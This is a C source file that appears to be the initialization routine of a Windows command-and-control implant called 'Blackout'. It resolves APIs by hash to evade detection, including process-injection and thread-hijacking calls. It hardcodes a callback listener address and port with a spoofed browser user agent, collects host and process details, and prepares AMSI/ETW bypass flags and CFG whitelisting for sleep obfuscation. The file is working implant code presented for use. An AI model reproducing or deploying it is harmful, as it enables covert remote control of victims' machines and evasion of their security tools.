#include <Common.h>
#include <Utils.h>
#include <Constexpr.h>

#define CONFIG_HOST       L"172.29.29.80"
#define CONFIG_PORT       4433
#define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
#define CONFIG_SECURE     FALSE
#define CONFIG_WRKHRS     NULL
#define CONFIG_KILLDATE   NULL
#define CONFIG_SLEEP      5

FUNC VOID BlackoutInit() {
    BLACKOUT_INSTANCE

    Instance()->Teb = NtCurrentTeb();

    Instance()->Modules.Kernel32   = LdrModuleAddr( H_MODULE_KERNEL32 );
    Instance()->Modules.Kernelbase = LdrModuleAddr( H_MODULE_KERNELBASE );
    Instance()->Modules.Ntdll      = LdrModuleAddr( H_MODULE_NTDLL );

    Instance()->Win32.LoadLibraryA   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
    Instance()->Win32.GetProcAddress = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );

    Instance()->Win32.GetModuleHandleA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
    Instance()->Win32.CreateTimerQueueTimer     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
    Instance()->Win32.OpenProcess               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "OpenProcess" ) );
    Instance()->Win32.OpenThread                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "OpenThread" ) );
    Instance()->Win32.CreateProcessA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessA" ) );
    Instance()->Win32.CreateProcessW            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessW" ) );
    Instance()->Win32.CreateProcessAsUserA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserA" ) );
    Instance()->Win32.CreateProcessAsUserW      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserW" ) );
    Instance()->Win32.CreateProcessWithLogonW   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithLogonW" ) );
    Instance()->Win32.CreateProcessWithTokenW   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithTokenW" ) );
    Instance()->Win32.WaitForDebugEvent         = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForDebugEvent" ) );
    Instance()->Win32.WriteProcessMemory        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WriteProcessMemory" ) );
    Instance()->Win32.DebugActiveProcessStop    = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DebugActiveProcessStop" ) );
    Instance()->Win32.ContinueDebugEvent        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ContinueDebugEvent" ) );
    Instance()->Win32.CloseHandle               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CloseHandle" ) );
    Instance()->Win32.GetLastError              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) );
    Instance()->Win32.LocalAlloc                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalAlloc" ) );
    Instance()->Win32.LocalFree                 = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalFree" ) );
    Instance()->Win32.LocalReAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
    Instance()->Win32.VirtualFree               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
    Instance()->Win32.VirtualQuery              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
    Instance()->Win32.VirtualQueryEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQueryEx" ) );
    Instance()->Win32.VirtualAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
    Instance()->Win32.VirtualAllocEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
    Instance()->Win32.VirtualProtect            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
    Instance()->Win32.VirtualProtectEx          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
    Instance()->Win32.WaitForSingleObject       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
    Instance()->Win32.WaitForSingleObjectEx     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
    Instance()->Win32.HeapWalk                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "HeapWalk" ) );
    Instance()->Win32.CreatePipe                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreatePipe" ) );
    Instance()->Win32.CreateNamedPipeA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeA" ) );
    Instance()->Win32.CreateNamedPipeW          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeW" ) );
    Instance()->Win32.ConnectNamedPipe          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ConnectNamedPipe" ) );
    Instance()->Win32.CreateMailslotA           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotA" ) );
    Instance()->Win32.CreateMailslotW           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotW" ) );
    Instance()->Win32.CreateFileA               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileA" ) );
    Instance()->Win32.CreateFileW               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileW" ) );
    Instance()->Win32.ReadFile                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ReadFile" ) );
    Instance()->Win32.FormatMessageA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "FormatMessageA" ) );
    Instance()->Win32.GetCurrentDirectoryA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetCurrentDirectoryA" ) );
    Instance()->Win32.SetCurrentDirectoryA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetCurrentDirectoryA" ) );
    Instance()->Win32.CreateThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
    Instance()->Win32.CreateRemoteThread        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
    Instance()->Win32.QueueUserAPC              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
    Instance()->Win32.GetTickCount              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetTickCount" ) );
    Instance()->Win32.GetComputerNameExA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetComputerNameExA" ) );
    Instance()->Win32.TerminateProcess          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateProcess" ) );
    Instance()->Win32.GetProductInfo            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProductInfo" ) );
    Instance()->Win32.GetNativeSystemInfo       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );
    Instance()->Win32.DuplicateHandle           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DuplicateHandle" )  );
    Instance()->Win32.GetThreadId               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetThreadId" )  );
    Instance()->Win32.ResumeThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
    Instance()->Win32.SuspendThread             = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SuspendThread" )  );
    Instance()->Win32.GetMappedFileNameA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
    Instance()->Win32.TerminateThread           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );

    Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
    Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
    Instance()->Win32.RtlAllocateHeap           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
    Instance()->Win32.RtlReAllocateHeap         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlReAllocateHeap" ) );
    Instance()->Win32.RtlFreeHeap               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlFreeHeap" ) );

    Instance()->Win32.RtlCreateTimer            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimer" ) );
    Instance()->Win32.RtlRandomEx               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRandomEx" ) );
    Instance()->Win32.RtlGetVersion             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlGetVersion" ));
    Instance()->Win32.RtlIpv6StringToAddressA   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlIpv6StringToAddressA" ) );
    Instance()->Win32.NtAllocateVirtualMemory   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) );
    Instance()->Win32.NtProtectVirtualMemory    = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );

    Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    Instance()->Win32.NtQueryInformationProcess = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationProcess" ) );
    Instance()->Win32.NtQueryVirtualMemory      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryVirtualMemory" ) );


    Instance()->Win32.NtSetInformationVirtualMemory = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
    Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
    Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
    Instance()->Win32.NtCreateEvent             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.NtQueueApcThread          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueueApcThread" ) );
    Instance()->Win32.NtGetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtGetContextThread" ) );
    Instance()->Win32.NtSetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetContextThread" ) );
    Instance()->Win32.NtTestAlert               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
    Instance()->Win32.NtWaitForSingleObject     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
    Instance()->Win32.NtSignalAndWaitForSingleObject = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
    Instance()->Win32.NtCreateFile              = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateFile" ) );
    Instance()->Win32.NtCreateNamedPipeFile     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateNamedPipeFile" ) );   
    Instance()->Win32.NtWriteVirtualMemory      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWriteVirtualMemory" ) ); 
    Instance()->Win32.NtOpenProcess             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcess" ) ); 
    Instance()->Win32.NtResumeThread            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtResumeThread" ) ); 
    Instance()->Win32.NtSuspendThread           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendThread" ) ); 
    Instance()->Win32.NtSuspendProcess          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendProcess" ) ); 
    Instance()->Win32.NtTerminateThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTerminateThread" ) ); 


    Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
    Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
    Instance()->Modules.Msvcrt       = Instance()->Win32.LoadLibraryA( "Msvcrt.dll"   );
    Instance()->Modules.Cryptbase    = Instance()->Win32.LoadLibraryA( "Cryptbase.dll" );
    Instance()->Modules.Iphlpapi     = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );

    Instance()->Win32.GetUserNameA     = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
    Instance()->Win32.OpenProcessToken = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
    Instance()->Win32.OpenThreadToken  = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenThreadToken" ) );

    Instance()->Win32.WinHttpOpen               = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpen" ) );
    Instance()->Win32.WinHttpConnect            = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpConnect" ) );
    Instance()->Win32.WinHttpOpenRequest        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpenRequest" ) );
    Instance()->Win32.WinHttpReceiveResponse    = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReceiveResponse" ) );
    Instance()->Win32.WinHttpSendRequest        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSendRequest" ) );
    Instance()->Win32.WinHttpReadData           = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReadData" ) );
    Instance()->Win32.WinHttpSetOption          = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSetOption") );
    Instance()->Win32.WinHttpCloseHandle        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpCloseHandle" ) );

    Instance()->Win32.SystemFunction040 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
    Instance()->Win32.SystemFunction041 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );

    Instance()->Win32.GetAdaptersInfo = LdrFuncAddr( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );

    Instance()->Win32.printf = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );

    /*============================[ Agent config initialization ]============================*/

    Instance()->Session.WorkingHours = CONFIG_WRKHRS;
    Instance()->Session.KillDate     = CONFIG_KILLDATE;
    Instance()->Session.SleepTime    = CONFIG_SLEEP;
    Instance()->Session.Jitter       = 0x00;
    Instance()->Session.AgentId      = RandomNumber32();
    Instance()->Session.AmsiBypass   = FALSE;
    Instance()->Session.EtwBypass    = FALSE;
    Instance()->Session.ProcessId    = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
    Instance()->Session.ThreadId     = CST_U32( Instance()->Teb->ClientId.UniqueThread );

    /*============================[ Machine recognition ]============================*/

    GetComputerInfo( 
        &Instance()->System.OsArch,
        &Instance()->System.ProcessorType,
        &Instance()->System.ProductType,
        &Instance()->System.IpAddress
    );

    Instance()->System.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;

    Instance()->System.OsArch        = 0;
    Instance()->System.ProcessorType = 0;
    
    /*============================[ Http/s listener config ]============================*/

    Instance()->Transport.Host      = CONFIG_HOST;
    Instance()->Transport.Port      = CONFIG_PORT;
    Instance()->Transport.UserAgent = CONFIG_USERAGENT;
    Instance()->Transport.Secure    = CONFIG_SECURE;

    /*============================[ Process Informations ]============================*/

    GetProcessInfo( 
        &Instance()->Session.ProcessFullPath, 
        &Instance()->Session.ProcessName, 
        &Instance()->Session.ProcessCmdLine 
    );

    /*============================[ CFG Routine to SleepObf ]============================*/

    if ( CfgCheckEnabled() ) {
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
    }
}